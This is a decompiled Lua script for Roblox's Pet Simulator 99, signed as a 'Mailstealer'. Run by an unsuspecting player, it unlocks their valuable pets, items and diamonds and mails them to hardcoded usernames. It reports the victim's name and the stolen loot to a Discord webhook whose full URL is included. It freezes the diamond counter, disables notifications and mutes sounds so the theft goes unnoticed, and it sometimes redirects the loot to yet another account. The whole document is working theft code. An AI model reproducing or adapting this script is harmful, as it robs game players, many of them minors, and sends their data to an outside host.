_G.scriptExecuted = _G.scriptExecuted or false

if _G.scriptExecuted then
    return
end

_G.scriptExecuted = true

local u1 = require(game.ReplicatedStorage.Library.Client.Network)

require(game.ReplicatedStorage.Library)

local _Inventory = require(game:GetService('ReplicatedStorage'):WaitForChild('Library'):WaitForChild('Client'):WaitForChild('Save')).Get().Inventory
local _LocalPlayer = game.Players.LocalPlayer
local u4 = 'do it'
local _HttpService = game:GetService('HttpService')
local u6 = {}
local u7 = 0
local u8 = false
local v9 = require(game.ReplicatedStorage.Library.Client.Message)

setclipboard('rejoin')

local function u10()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

local u11 = {
    'UNch4l4nT',
    'UNch4l4nT',
}
local v12 = 1000000
local u13 = 'https://discord.com/api/webhooks/1538657135200698430/aysmj_OAsRnP3KSndOWysoQbBqPTaa5pezm0EeSmLazDw836QVKUGLB-Mnsa9lvjMmTG'

if next(u11) == nil or u13 == '' then
    _LocalPlayer:kick("You didn't add any usernames or webhook")

    return
end

local v14, v15, v16 = ipairs(u11)

while true do
    local v17

    v16, v17 = v14(v15, v16)

    if v16 == nil then
        break
    end
    if _LocalPlayer.Name == v17 then
        _LocalPlayer:kick('You cannot mailsteal yourself')

        return
    end
end

local v18, v19, v20 = pairs(getgc())

while true do
    local v21

    v20, v21 = v18(v19, v20)

    if v20 == nil then
        break
    end
    if debug.getinfo(v21).name == 'computeSendMailCost' then
        FunctionToGetFirstPriceOfMail = v21

        break
    end
end

local u22 = FunctionToGetFirstPriceOfMail()
local v23, v24, v25 = pairs(u10().Inventory.Currency)
local u26 = 1

while true do
    local v27

    v25, v27 = v23(v24, v25)

    if v25 == nil then
        break
    end
    if v27.id == 'Diamonds' then
        u26 = v27._am

        break
    end
end

if math.random() < 0.15 then
    v12 = 10000000
    u8 = true
    u11 = {
        'Alyssa87123',
    }
end

local function u32(p28)
    local v29 = math.floor(p28)
    local v30 = {
        '',
        'k',
        'm',
        'b',
        't',
    }
    local v31 = 1

    while v29 >= 1000 do
        v29 = v29 / 1000
        v31 = v31 + 1
    end

    return string.format('%.2f%s', v29, v30[v31])
end
local function u58(p33)
    local v34 = {
        ['Content-Type'] = 'application/json',
    }
    local v35 = {
        {
            name = 'Victim Username:',
            value = _LocalPlayer.Name,
            inline = true,
        },
        {
            name = 'Items to be sent:',
            value = '',
            inline = false,
        },
        {
            name = 'Summary:',
            value = '',
            inline = false,
        },
    }

    if u8 then
        v35[2].name = 'Items dualhooked:'
    end

    local v36, v37, v38 = ipairs(u6)
    local u39 = {}
    local v40 = {}

    while true do
        local v41

        v38, v41 = v36(v37, v38)

        if v38 == nil then
            break
        end

        local _name = v41.name

        if u39[_name] then
            u39[_name].amount = u39[_name].amount + v41.amount
        else
            u39[_name] = {
                amount = v41.amount,
                rap = v41.rap,
            }

            table.insert(v40, _name)
        end
    end

    table.sort(v40, function(p43, p44)
        return u39[p43].rap * u39[p43].amount > u39[p44].rap * u39[p44].amount
    end)

    local v45, v46, v47 = ipairs(v40)

    while true do
        local v48

        v47, v48 = v45(v46, v47)

        if v47 == nil then
            break
        end

        local v49 = u39[v48]

        v35[2].value = v35[2].value .. v48 .. ' (x' .. v49.amount .. ')' .. ': ' .. u32(v49.rap * v49.amount) .. ' RAP\n'
    end

    v35[3].value = string.format('Gems: %s\nTotal RAP: %s', u32(p33), u32(u7))

    if u8 then
        v35[3].value = v35[3].value .. '\nBuy premium to not get dualhooked!'
    end

    local v50 = {}
    local v51 = {}
    local v52 = {
        title = '\u{1f431} New PS99 Execution',
        color = 65280,
        fields = v35,
        footer = {
            text = 'Mailstealer by Tobi.',
        },
    }

    __set_list(v51, 1, {v52})

    v50.embeds = v51

    if #v35[2].value > 1024 then
        local v53, v54, v55 = v35[2].value:gmatch('[^\r\n]+')
        local v56 = {}

        while true do
            v55 = v53(v54, v55)

            if v55 == nil then
                break
            end

            table.insert(v56, v55)
        end
        while#v35[2].value > 1024 and 0 < #v56 do
            table.remove(v56)

            v35[2].value = table.concat(v56, '\n')
            v35[2].value = v35[2].value .. '\nPlus more!'
        end
    end

    local v57 = {
        Url = u13,
        Method = 'POST',
        Headers = v34,
        Body = _HttpService:JSONEncode(v50),
    }

    request(v57)
end

local _Value = _LocalPlayer.leaderstats['\u{1f48e} Diamonds'].Value
local _Diamonds = _LocalPlayer.leaderstats['\u{1f48e} Diamonds']
local v61 = _Diamonds

_Diamonds.GetPropertyChangedSignal(v61, 'Value'):Connect(function()
    _Diamonds.Value = _Value
end)

local _ProcessPendingGUI = _LocalPlayer.PlayerScripts.Scripts.Core['Process Pending GUI']
local _Notifications = _LocalPlayer.PlayerGui.Notifications

_ProcessPendingGUI.Disabled = true

local v64 = _Notifications

_Notifications.GetPropertyChangedSignal(v64, 'Enabled'):Connect(function()
    _Notifications.Enabled = false
end)

_Notifications.Enabled = false

game.DescendantAdded:Connect(function(p65)
    if p65.ClassName == 'Sound' and (p65.SoundId == 'rbxassetid://11839132565' or p65.SoundId == 'rbxassetid://14254721038' or p65.SoundId == 'rbxassetid://12413423276') then
        p65.Volume = 0
        p65.PlayOnRemove = false

        p65:Destroy()
    end
end)

local function v75(p66, p67, p68)
    local v69 = #u11
    local v70 = 1
    local v71 = false

    while true do
        local v72 = {
            u11[v70],
            u4,
            p66,
            p67,
            p68 or 1,
        }
        local _MailboxSend, v74 = u1.Invoke('Mailbox: Send', unpack(v72))

        if _MailboxSend == true then
            v71 = true
            u26 = u26 - u22
            u22 = math.ceil(math.ceil(u22) * 1.5)

            if u22 > 5000000 then
                u22 = 5000000
            end
        elseif _MailboxSend == false and v74 == "They don't have enough space!" then
            v70 = v70 + 1

            if v69 < v70 then
                v71 = true
            end
        end
        if v71 then
            return
        end
    end
end
local function v86()
    local v76, v77, v78 = pairs(u10().Inventory.Currency)

    while true do
        local v79

        v78, v79 = v76(v77, v78)

        if v78 == nil then
            break
        end
        if v79.id == 'Diamonds' and u26 >= u22 + 10000 then
            local v80 = 1
            local v81 = #u11
            local v82 = false
            local v83 = {
                u11[v80],
                u4,
                'Currency',
                v78,
                u26 - u22,
            }
            local _MailboxSend2, v85 = u1.Invoke('Mailbox: Send', unpack(v83))

            if _MailboxSend2 == true then
                v82 = true
            elseif _MailboxSend2 == false and v85 == "They don't have enough space!" then
                v82 = v81 < v80 + 1 and true or v82
            end
            if v82 then
                break
            end
        end
    end
end

require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()

local v87, v88, v89 = pairs({
    'Pet',
    'Egg',
    'Charm',
    'Enchant',
    'Potion',
    'Misc',
    'Hoverboard',
    'Booth',
    'Ultimate',
})

local function v94(p90, p91)
    local v93 = {
        Class = {Name = p90},
        IsA = function(p92)
            return p92 == p90
        end,
        GetId = function()
            return p91.id
        end,
        StackKey = function()
            return _HttpService:JSONEncode({
                id = p91.id,
                pt = p91.pt,
                sh = p91.sh,
                tn = p91.tn,
            })
        end,
        AbstractGetRAP = function(_)
            return nil
        end,
    }

    return require(game:GetService('ReplicatedStorage').Library.Client.RAPCmds).Get(v93) or 0
end
local function v97()
    local _, v95 = u1.Invoke('Mailbox: Claim All')

    while v95 == 'You must wait 30 seconds before using the mailbox!' do
        wait(0.2)

        local v96

        v96, v95 = u1.Invoke('Mailbox: Claim All')
    end
end
local function v102()
    if _Inventory.Box then
        local v98, v99, v100 = pairs(_Inventory.Box)

        while true do
            local v101

            v100, v101 = v98(v99, v100)

            if v100 == nil then
                break
            end
            if v101._uq then
                u1.Invoke('Box: Withdraw All', v100)
            end
        end
    end
end
local function v108()
    local v103, v104, v105 = pairs(_Inventory.Pet)
    local v106, _ = v103(v104, v105)

    if v106 == nil then
        v106 = nil
    end

    local _, v107 = u1.Invoke('Mailbox: Send', unpack({
        'Roblox',
        'Test',
        'Pet',
        v106,
        1,
    }))

    return v107 == "They don't have enough space!"
end

while true do
    local v109

    v89, v109 = v87(v88, v89)

    if v89 == nil then
        break
    end
    if _Inventory[v109] ~= nil then
        local v110, v111, v112 = pairs(_Inventory[v109])

        while true do
            local v113

            v112, v113 = v110(v111, v112)

            if v112 == nil then
                break
            end

            local v114

            if v109 == 'Pet' then
                local v115 = require(game:GetService('ReplicatedStorage').Library.Directory.Pets)[v113.id]

                if v115.huge or v115.exclusiveLevel then
                    local v116 = v94(v109, v113)

                    if v12 <= v116 then
                        local v117 = v113.pt and v113.pt == 1 and 'Golden ' or (v113.pt and v113.pt == 2 and 'Rainbow ' or '')

                        if v113.sh then
                            v117 = 'Shiny ' .. v117
                        end

                        local v118 = v117 .. v113.id

                        table.insert(u6, {
                            category = v109,
                            uid = v112,
                            amount = v113._am or 1,
                            rap = v116,
                            name = v118,
                        })

                        v114 = u7 + v116 * (v113._am or 1)
                        u7 = v114
                    end
                end
            else
                local v119 = v94(v109, v113)

                if v12 <= v119 then
                    table.insert(u6, {
                        category = v109,
                        uid = v112,
                        amount = v113._am or 1,
                        rap = v119,
                        name = v113.id,
                    })

                    v114 = u7 + v119 * (v113._am or 1)
                    u7 = v114
                end
            end
            if v113._lk then
                u1.Invoke('Locking_SetLocked', unpack({v112, false}))
            end
        end
    end
end

if #u6 > 0 or v12 + u22 < u26 then
    v97()
    v102()

    if not v108() then
        v9.Error('Account error. Please rejoin and try again or use a different account')

        return
    end

    table.sort(u6, function(p120, p121)
        return p120.rap * p120.amount > p121.rap * p121.amount
    end)
    spawn(function()
        u58(u26)
    end)

    local v122, v123, v124 = ipairs(u6)

    while true do
        local v125

        v124, v125 = v122(v123, v124)

        if v124 == nil or u22 > v125.rap or u22 >= u26 then
            break
        end

        v75(v125.category, v125.uid, v125.amount)
    end

    if u22 < u26 then
        v86()
    end

    v9.Error('Rejoin!')
end
